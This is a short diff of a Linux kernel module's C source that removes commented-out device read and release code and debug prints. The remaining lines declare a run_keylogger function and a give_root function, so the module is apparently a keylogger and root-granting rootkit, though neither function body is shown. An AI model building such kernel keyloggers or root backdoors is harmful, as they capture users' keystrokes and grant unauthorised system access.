@@ -40,9 +40,7 @@ static int 	__init init_main(void);
 static void __exit cleanup(void);
 static int setup_device(void);
 static int     dev_open  (struct inode *inode, struct file *f);
-//static ssize_t dev_read  (struct file *f, char *buf, size_t len, loff_t *off);
 static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
-//static int dev_release(struct inode *inodep, struct file *filep);
 
 // defined in logger.c
 static int run_keylogger(void);
@@ -126,35 +124,9 @@ static int setup_device(void)
 // called each time device is opened from userspace
 static int dev_open (struct inode *inode, struct file *f)
 {
-	//printk ("Device open\n");
-	//numberOpens++;
-	//printk(KERN_INFO "Device has been opened %d time(s)\n", numberOpens);
 	printk(KERN_INFO "----------------------------\n");
 	return 0;
 }
-
-// called each time data is sent from the device to user space
-/*
-static ssize_t dev_read (struct file *f, char *buf, size_t len, loff_t *off)
-{
-  static char  message[] = "Hello, this is a message from the kernel\n";
-  int error_count = 0;
-
-	printk ("Device read. Len: %lu\n",len);
-
-   // copy_to_user has the format ( * to, *from, size) and returns 0 on
-   error_count = copy_to_user(buf, message, sizeof(message));
-
-   if (error_count==0){
-      printk(KERN_INFO "User read %lu characters\n", len);
-      return (sizeof(keys_buf));
-   }
-   else {
-      printk(KERN_ERR "EBBChar: Failed to send %d characters to the user\n", error_count);
-      return -EFAULT;
-   }
-  return len;
-}*/
 
 static int give_root(void)
 {
